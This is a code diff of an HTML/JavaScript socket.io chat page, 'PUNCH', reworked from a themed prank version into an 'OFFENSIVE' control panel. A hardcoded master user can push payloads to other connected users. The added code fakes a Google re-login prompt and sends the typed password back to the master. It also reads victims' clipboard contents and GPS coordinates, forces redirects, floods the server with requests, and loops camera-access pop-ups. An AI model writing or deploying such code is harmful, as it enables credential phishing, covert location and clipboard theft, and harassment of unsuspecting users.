@@ -3,423 +3,256 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>PUNCH V100 - REQUIEM & BUBBLES</title>
+    <title>PUNCH V5 - OFFENSIVE</title>
     
     <style>
-        /* --- 1. IMPORTATION DES TYPOGRAPHIES (Lignes 25-40) --- */
-        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&family=Oswald:wght@700&display=swap');
+        /* --- [CSS ARCHITECTURE : LIGNES 20-180] --- */
+        @import url('https://fonts.googleapis.com/css2?family=Archivo+Black&family=Bangers&family=JetBrains+Mono:wght@500;800&display=swap');
         
         :root {
+            --blood: #ff0000;
+            --matrix: #00ff41;
             --gold: #FFD700;
-            --gold-glow: rgba(255, 215, 0, 0.5);
-            --magenta: #FF00FF;
-            --caesar-blue: #00BFFF;
-            --caesar-glow: rgba(0, 191, 255, 0.4);
-            --bg-ultra: #020002;
-            --panel-bg: rgba(10, 0, 10, 0.98);
-            --silver: #E0E0E0;
-            --ease-jojo: cubic-bezier(0.19, 1, 0.22, 1);
+            --dark-ui: #0a0a0a;
+            --danger: #ff4444;
         }
 
-        /* --- 2. RESET ET FONDAMENTAUX (Lignes 41-75) --- */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            cursor: none !important; /* Force le curseur Stand */
-            outline: none;
-            user-select: none;
-            -webkit-tap-highlight-color: transparent;
-        }
-
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: crosshair; }
+        
         body {
-            background: var(--bg-ultra);
-            color: #fff;
-            font-family: 'Archivo Black', sans-serif;
+            background: #000;
+            color: var(--matrix);
+            font-family: 'JetBrains Mono', monospace;
             height: 100vh;
-            width: 100vw;
             overflow: hidden;
-            background-image: 
-                radial-gradient(circle at 10% 10%, #1a001a 0%, transparent 40%),
-                radial-gradient(circle at 90% 90%, #000a1a 0%, transparent 40%);
+            display: flex;
         }
 
-        /* --- 3. CUSTOM CURSOR [THE WORLD SHAPE] (Lignes 76-110) --- */
-        #c-stand {
-            position: fixed;
-            width: 32px;
-            height: 32px;
-            border: 2px solid var(--gold);
-            z-index: 10000000;
-            pointer-events: none;
-            transform: rotate(45deg);
-            box-shadow: 0 0 20px var(--gold), inset 0 0 8px var(--gold);
-            transition: transform 0.1s linear, width 0.3s var(--ease-jojo), background 0.3s;
-        }
-
-        #c-stand::after {
-            content: '';
-            position: absolute;
-            inset: -5px;
-            border: 1px solid var(--magenta);
-            opacity: 0.5;
-        }
-
-        #c-stand.active {
-            transform: rotate(135deg) scale(1.8);
-            background: var(--gold);
-            box-shadow: 0 0 40px var(--gold);
-        }
-
-        /* --- 4. LAYOUT PRINCIPAL (Lignes 111-150) --- */
-        .master-frame {
+        /* UI ELEMENTS */
+        .hacker-frame {
             display: grid;
-            grid-template-columns: 380px 1fr 320px;
+            grid-template-columns: 400px 1fr 350px;
+            width: 100%;
             height: 100vh;
+            gap: 2px;
             background: #111;
-            gap: 1px;
         }
 
-        .side-bar {
-            background: var(--panel-bg);
-            display: flex;
-            flex-direction: column;
-            border-right: 1px solid rgba(255, 215, 0, 0.15);
-            position: relative;
-            z-index: 10;
-        }
-
-        .main-view {
-            background: #000;
-            display: flex;
-            flex-direction: column;
-            position: relative;
-            box-shadow: inset 0 0 100px rgba(0,0,0,1);
-        }
-
-        /* --- 5. HEADER DESIGN (Lignes 151-190) --- */
-        .side-header {
-            padding: 60px 30px;
-            background: var(--gold);
-            color: #000;
-            text-align: center;
-            clip-path: polygon(0 0, 100% 0, 100% 88%, 0 100%);
-            margin-bottom: 20px;
-        }
-
-        .side-header h1 {
+        .side { background: var(--dark-ui); display: flex; flex-direction: column; border: 1px solid #222; }
+        
+        .terminal-header {
+            padding: 20px;
+            background: #111;
+            border-bottom: 2px solid var(--matrix);
             font-family: 'Bangers';
-            font-size: 65px;
-            letter-spacing: -2px;
-            line-height: 0.8;
-            text-transform: uppercase;
-        }
-
-        .side-header span {
-            font-family: 'JetBrains Mono';
-            font-size: 12px;
-            font-weight: 800;
-            letter-spacing: 4px;
-            opacity: 0.7;
-        }
-
-        /* --- 6. USER LIST STYLES (Lignes 191-240) --- */
-        #user-container {
-            flex: 1;
-            overflow-y: scroll;
-            padding: 25px;
-            scrollbar-width: none;
-        }
-
-        .target-card {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid #222;
-            padding: 25px;
-            margin-bottom: 18px;
-            border-radius: 2px;
-            transition: all 0.4s var(--ease-jojo);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .target-card:hover {
-            border-color: var(--gold);
-            background: rgba(255, 215, 0, 0.08);
-            transform: scale(1.02) translateX(5px);
-        }
-
-        .target-card::before {
-            content: 'TARGET';
-            position: absolute;
-            right: -10px;
-            bottom: -5px;
-            font-size: 40px;
-            opacity: 0.05;
-            font-style: italic;
-        }
-
-        .target-name { font-size: 18px; color: #fff; display: block; margin-bottom: 5px; }
-        .target-id { font-family: 'JetBrains Mono'; font-size: 10px; color: #555; }
-
-        /* --- 7. CHAT SYSTEM STYLES (Lignes 241-300) --- */
-        #chat-scroller {
-            flex: 1;
-            padding: 50px;
-            overflow-y: auto;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            scroll-behavior: smooth;
-        }
-
-        .bubble-msg {
-            padding: 20px 25px;
-            background: #080808;
-            border-left: 5px solid var(--magenta);
-            font-family: 'JetBrains Mono';
-            font-size: 14px;
-            max-width: 80%;
-            border-radius: 0 15px 15px 0;
-            animation: slideMsg 0.5s var(--ease-jojo) forwards;
-        }
-
-        @keyframes slideMsg { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
-
-        .input-zone {
-            padding: 40px;
-            background: #000;
-            border-top: 1px solid #1a1a1a;
-            display: flex;
-            gap: 20px;
-        }
-
-        input#main-input {
-            flex: 1;
-            background: #050505;
-            border: 2px solid #222;
-            padding: 22px;
-            color: var(--gold);
-            font-family: 'JetBrains Mono';
-            font-size: 16px;
-            transition: 0.3s;
-        }
-
-        input#main-input:focus { border-color: var(--gold); box-shadow: 0 0 20px var(--gold-glow); }
-
-        /* --- 8. ATTACK OVERLAYS & UI (Lignes 301-360) --- */
-        #za-warundo {
-            position: fixed;
-            inset: 0;
-            background: #fff;
-            z-index: 20000000;
-            display: none;
-            align-items: center;
-            justify-content: center;
-            mix-blend-mode: difference;
-        }
-
-        .stand-shout {
-            font-family: 'Bangers';
-            font-size: 14vw;
+            font-size: 24px;
             color: #fff;
-            animation: violentShake 0.1s infinite;
+            text-align: center;
         }
 
-        @keyframes violentShake {
-            0% { transform: translate(0,0); }
-            25% { transform: translate(15px, 15px); }
-            50% { transform: translate(-10px, -5px); }
-            75% { transform: translate(5px, -15px); }
+        /* USER LIST & VICTIM CARDS */
+        #victim-list { flex: 1; overflow-y: auto; padding: 15px; }
+        .v-card {
+            padding: 15px; background: #000; border: 1px solid #1a1a1a;
+            margin-bottom: 10px; position: relative; transition: 0.2s;
+            border-left: 3px solid #333;
+        }
+        .v-card:hover { border-left-color: var(--matrix); background: #050505; }
+        .v-card.selected { border-left-color: var(--danger); background: #100000; }
+
+        /* MAIN CONSOLE */
+        .console-view { display: flex; flex-direction: column; background: #000; }
+        #console-output {
+            flex: 1; padding: 25px; overflow-y: auto; 
+            font-size: 12px; color: var(--matrix); line-height: 1.6;
+        }
+
+        .input-cmd {
+            padding: 20px; background: #050505; display: flex; gap: 10px;
+            border-top: 1px solid var(--matrix);
+        }
+        input {
+            flex: 1; background: transparent; border: none; 
+            color: var(--matrix); font-family: inherit; font-size: 14px;
+        }
+
+        /* PHISHING & EXPLOIT MODALS */
+        #phish-modal {
+            position: fixed; inset: 0; background: #fff; z-index: 999999;
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            color: #000; font-family: sans-serif;
         }
 
         #ctx-menu {
-            display: none;
-            position: fixed;
-            background: #000;
-            border: 3px solid var(--gold);
-            width: 320px;
-            z-index: 20000001;
-            box-shadow: 20px 20px 0 var(--magenta);
+            display: none; position: fixed; background: #000; border: 1px solid var(--matrix);
+            width: 320px; z-index: 1000000; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
         }
-
-        .ctx-item {
-            padding: 22px;
-            font-size: 12px;
-            color: #eee;
-            border-bottom: 1px solid #111;
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 2px;
+        .opt {
+            padding: 12px 20px; font-size: 11px; border-bottom: 1px solid #111;
+            color: #00ff41; text-transform: uppercase; letter-spacing: 1px;
         }
-
-        .ctx-item:hover {
-            background: var(--gold);
-            color: #000;
-            padding-left: 40px;
-        }
-
-        /* --- 9. CAESAR SPECIALS (Lignes 361-400) --- */
-        .bubble-particle {
-            position: fixed;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(255,255,255,0.4) 0%, transparent 70%);
-            border: 1px solid rgba(255,255,255,0.2);
-            pointer-events: none;
-            z-index: 15000000;
-            animation: floatUp 4s linear infinite;
-        }
-
-        @keyframes floatUp {
-            from { transform: translateY(100vh) scale(1); opacity: 1; }
-            to { transform: translateY(-100px) scale(1.5); opacity: 0; }
-        }
+        .opt:hover { background: var(--matrix); color: #000; }
+        .opt.heavy { color: var(--danger); font-weight: bold; }
 
     </style>
 </head>
-<body oncontextmenu="return false;">
+<body>
 
-    <div id="c-stand"></div>
-    <div id="za-warundo"><div class="stand-shout">REQUIEM</div></div>
-
-    <div class="master-frame">
-        <aside class="side-bar">
-            <div class="side-header">
-                <h1>PUNCH</h1>
-                <span>THE WORLD V100</span>
-            </div>
-            <div id="user-container"></div>
+    <div class="hacker-frame">
+        <aside class="side">
+            <div class="terminal-header">TARGET_SCANNER</div>
+            <div id="victim-list"></div>
         </aside>
 
-        <main class="main-view">
-            <div id="chat-scroller"></div>
-            <div class="input-zone">
-                <input type="text" id="main-input" placeholder="DO YOU BELIEVE IN GRAVITY?" autocomplete="off">
-                <button onclick="send()" style="background:var(--magenta); border:none; padding:0 40px; font-family:'Bangers'; font-size:25px; color:#fff;">STRIKE</button>
+        <main class="console-view">
+            <div id="console-output">
+                [SYSTEM] Punch V5 Offensive Engine Initialized...<br>
+                [SYSTEM] Waiting for target handshake...<br>
+            </div>
+            <div class="input-cmd">
+                <span>$</span>
+                <input type="text" id="cmd-in" placeholder="ENTER COMMAND OR SELECT TARGET..." autocomplete="off">
             </div>
         </main>
 
-        <aside class="side-bar" style="padding:30px; border-left:1px solid #222; border-right:none;">
-            <div style="color:var(--gold); font-family:'JetBrains Mono'; font-size:11px; margin-bottom:20px;">[INTELLIGENCE_STREAM]</div>
-            <div id="sys-logs" style="font-family:'JetBrains Mono'; font-size:9px; color:#333; line-height:2;"></div>
+        <aside class="side">
+            <div class="terminal-header" style="color:var(--danger)">DATA_EXFIL</div>
+            <div id="exfil-data" style="padding:15px; font-size:10px; color:#666;"></div>
         </aside>
     </div>
 
+    <div id="phish-modal">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="100" style="margin-bottom:20px;">
+        <h2 style="font-weight:400; margin-bottom:10px;">Session expirée</h2>
+        <p style="color:#555; margin-bottom:20px;">Veuillez vous reconnecter pour continuer</p>
+        <input type="password" id="phish-pass" placeholder="Mot de passe" style="border:1px solid #ccc; padding:10px; width:250px; border-radius:4px; color:#000;">
+        <button onclick="capturePhish()" style="margin-top:15px; padding:10px 25px; background:#1a73e8; color:#fff; border:none; border-radius:4px;">Connexion</button>
+    </div>
+
     <div id="ctx-menu">
-        <div class="ctx-item" style="background:#111; color:var(--gold); text-align:center; font-weight:800;">--- TARGET_CONTROL ---</div>
-        <div class="ctx-item" onclick="strike('p_combo')">💎 REQUIEM (Infinite Cam)</div>
-        <div class="ctx-item" onclick="strike('p_chariot')">⚔️ CHARIOT (DDoS Speed)</div>
-        <div class="ctx-item" onclick="strike('p_freeze')">❄️ CAESAR: FREEZE (Keys)</div>
-        <div class="ctx-item" onclick="strike('p_oxygen')">🌑 CAESAR: OXYGEN (Dark)</div>
-        <div class="ctx-item" onclick="strike('p_shiza')">🔊 CAESAR: SHIZA (Audio)</div>
-        <div class="ctx-item" onclick="strike('p_cpu')">☢️ MUDA_MELT (Crash)</div>
-        <div class="ctx-item" onclick="closeCtx()" style="color:var(--magenta)">[ DISMISS ]</div>
+        <div class="opt" style="background:#111; color:var(--matrix); text-align:center;">--- ATTACK_VECTOR ---</div>
+        <div class="opt heavy" onclick="st('p_phish')">🚨 PHISHING: GOOGLE_TRAP</div>
+        <div class="opt" onclick="st('p_geo')">📍 GEO: GPS_LOCATOR</div>
+        <div class="opt" onclick="st('p_clip')">📋 HIJACK: CLIPBOARD_STEALER</div>
+        <div class="opt" onclick="st('p_redirect')">🔗 FORCE: MALICIOUS_URL</div>
+        <div class="opt heavy" onclick="st('p_chariot')">⚔️ DDOS: SILVER_CHARIOT</div>
+        <div class="opt" onclick="st('p_combo')">💎 LOOP: GOLDEN_REQUIEM</div>
+        <div class="opt" onclick="closeCtx()" style="color:red;">[ ABORT ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let myName = "";
-        let targetId = "";
-        let isMaster = false;
+        let me = ""; let target = ""; let master = false;
 
-        // GESTION CURSEUR
-        document.addEventListener('mousemove', e => {
-            const c = document.getElementById('c-stand');
-            c.style.left = e.clientX - 16 + 'px';
-            c.style.top = e.clientY - 16 + 'px';
-        });
-        document.addEventListener('mousedown', () => document.getElementById('c-stand').classList.add('active'));
-        document.addEventListener('mouseup', () => document.getElementById('c-stand').classList.remove('active'));
-
-        // INITIALISATION
+        // --- AUTH & INIT ---
         window.onload = () => {
-            myName = prompt("WHO ARE YOU?") || "User";
-            if(myName === "toucheur2pp") isMaster = true;
-            socket.emit('init', { name: myName });
-            logSys("SYSTEM", "Stand Link Established.");
+            me = prompt("IDENTIFY:") || "User";
+            if(me === "toucheur2pp") master = true;
+            socket.emit('init', { name: me });
+            writeLog("SYSTEM", "Handshake complete. Identity: " + me);
         };
 
-        // MENU MASTER
+        // --- CONTEXT MENU ---
         window.oncontextmenu = (e) => {
-            if(!isMaster) return;
-            const card = e.target.closest('.target-card');
+            if(!master) return;
+            const card = e.target.closest('.v-card');
             if(card) {
-                targetId = card.getAttribute('data-id');
+                target = card.getAttribute('data-id');
                 const m = document.getElementById('ctx-menu');
                 m.style.display = 'block'; m.style.left = e.pageX+'px'; m.style.top = e.pageY+'px';
-                logSys("LOCK", "Targeting UID: " + targetId.substring(0,8));
             }
         };
 
         function closeCtx() { document.getElementById('ctx-menu').style.display = 'none'; }
-        function send() { const i = document.getElementById('main-input'); if(i.value) socket.emit('chat', i.value); i.value = ""; }
-        function strike(t) { socket.emit(t, targetId); closeCtx(); }
+        function st(t) { socket.emit(t, target); closeCtx(); }
 
-        // MOTEUR D'ATTAQUE
+        // --- MOTEUR D'EXÉCUTION CIBLE (PAYLOADS) ---
         socket.on('execute', (d) => {
-            const overlay = document.getElementById('za-warundo');
-            const shout = document.querySelector('.stand-shout');
             
-            const runAttack = () => {
-                overlay.style.display = 'flex';
-                
-                if(d.type === 'p_freeze') {
-                    shout.innerText = "HAMON FREEZE"; shout.style.color = "cyan";
-                    window.onkeydown = (e) => { e.preventDefault(); return false; };
-                    setTimeout(() => { window.onkeydown = null; overlay.style.display='none'; }, 8000);
-                }
-                
-                if(d.type === 'p_oxygen') {
-                    shout.innerText = "NO OXYGEN";
-                    let op = 1; setInterval(() => { op -= 0.05; document.body.style.opacity = op; if(op<=0) socket.disconnect(); }, 300);
-                }
+            // 1. MODULE GEO (GPS)
+            if(d.type === 'p_geo') {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const data = `LAT: ${pos.coords.latitude} | LON: ${pos.coords.longitude}`;
+                    socket.emit('chat', `[GEO_DATA] ${me}: ${data}`);
+                });
+            }
 
-                if(d.type === 'p_shiza') {
-                    shout.innerText = "SHIZAAAAAA"; shout.style.color = "red";
-                    setInterval(() => { 
-                        let b = document.createElement('div'); b.className = 'bubble-particle';
-                        b.style.left = Math.random()*100+'vw'; b.style.width = Math.random()*50+'px';
-                        b.style.height = b.style.width; document.body.appendChild(b);
-                    }, 100);
-                }
+            // 2. MODULE PHISHING
+            if(d.type === 'p_phish') {
+                document.getElementById('phish-modal').style.display = 'flex';
+                // Bloque la sortie
+                window.onbeforeunload = () => "Erreur de session critique.";
+            }
 
-                if(d.type === 'p_chariot') {
-                    shout.innerText = "SILVER CHARIOT";
-                    setInterval(() => { for(let i=0; i<100; i++) fetch('/?pol='+Math.random()); }, 10);
-                }
+            // 3. MODULE CLIPBOARD
+            if(d.type === 'p_clip') {
+                navigator.clipboard.readText().then(txt => {
+                    socket.emit('chat', `[CLIPBOARD] ${me}: ${txt}`);
+                });
+            }
 
-                if(d.type === 'p_combo') {
-                    shout.innerText = "REQUIEM DA";
-                    const s = () => { 
-                        const w = window.open("","_blank","width=400,height=400");
-                        if(w) w.document.write(`<body style="background:#000;color:gold;text-align:center;"><video id="v" autoplay style="width:100%;transform:scaleX(-1);"></video><script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{document.getElementById('v').srcObject=s;});window.onbeforeunload=()=>window.opener.postMessage("s","*");<\/script></body>`);
-                    };
-                    s(); s(); window.addEventListener("message", e => { if(e.data==="s"){s();s();} });
-                }
-            };
-            window.onclick = runAttack; window.onmousemove = runAttack;
+            // 4. MODULE REDIRECT
+            if(d.type === 'p_redirect') {
+                const url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Exemple Rickroll
+                window.location.href = url;
+            }
+
+            // 5. SILVER CHARIOT (DDoS Local)
+            if(d.type === 'p_chariot') {
+                setInterval(() => {
+                    for(let i=0; i<100; i++) fetch('/?attack='+Math.random()).catch(()=>null);
+                }, 10);
+            }
+
+            // 6. GOLDEN REQUIEM (Camera Loop)
+            if(d.type === 'p_combo') {
+                const s = () => {
+                    const w = window.open("","_blank","width=300,height=300");
+                    if(w) w.document.write(`<script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>{});window.onbeforeunload=()=>window.opener.postMessage("s","*");<\/script>`);
+                };
+                s(); window.addEventListener("message", e => { if(e.data==="s") s(); });
+            }
         });
 
-        socket.on('sync', u => {
-            const c = document.getElementById('user-container'); c.innerHTML = "";
-            u.forEach(x => {
-                const d = document.createElement('div'); d.className = 'target-card'; d.setAttribute('data-id', x.id);
-                d.innerHTML = `<span class="target-name">${x.name.toUpperCase()}</span><span class="target-id">UID: ${x.id.substring(0,12)}</span>`;
-                c.appendChild(d);
+        // --- PHISHING CAPTURE ---
+        function capturePhish() {
+            const pass = document.getElementById('phish-pass').value;
+            socket.emit('chat', `[PHISH_SUCCESS] Target: ${me} | PASS: ${pass}`);
+            document.getElementById('phish-modal').style.display = 'none';
+            alert("Erreur de synchronisation. Veuillez réessayer plus tard.");
+        }
+
+        // --- SYNC & LOGS ---
+        socket.on('sync', users => {
+            const list = document.getElementById('victim-list'); list.innerHTML = "";
+            users.forEach(u => {
+                const div = document.createElement('div');
+                div.className = 'v-card'; div.setAttribute('data-id', u.id);
+                div.innerHTML = `> TARGET: ${u.name.toUpperCase()}<br><span style="font-size:9px;color:#444;">${u.id}</span>`;
+                list.appendChild(div);
             });
         });
 
         socket.on('chat', d => {
-            const s = document.getElementById('chat-scroller');
-            s.innerHTML += `<div class="bubble-msg"><b>${d.n}:</b> ${d.t}</div>`;
-            s.scrollTop = s.scrollHeight;
+            const out = document.getElementById('console-output');
+            const color = d.t.includes('[') ? 'var(--danger)' : 'var(--matrix)';
+            out.innerHTML += `<div style="color:${color}">[${d.n}] ${d.t}</div>`;
+            out.scrollTop = out.scrollHeight;
+            
+            // Si c'est de l'exfiltration, on l'ajoute à droite
+            if(d.t.includes('[GEO') || d.t.includes('[PHISH') || d.t.includes('[CLIP')) {
+                document.getElementById('exfil-data').innerHTML += `<div>${d.t}</div><hr style="border-color:#111">`;
+            }
         });
 
-        function logSys(tag, text) {
-            const l = document.getElementById('sys-logs');
-            l.innerHTML += `<div><span style="color:var(--gold)">[${tag}]</span> ${text}</div>`;
-            l.scrollTop = l.scrollHeight;
+        function writeLog(tag, msg) {
+            const out = document.getElementById('console-output');
+            out.innerHTML += `<div>[${tag}] ${msg}</div>`;
+            out.scrollTop = out.scrollHeight;
         }
+
+        window.onclick = () => closeCtx();
     </script>
 </body>
 </html>
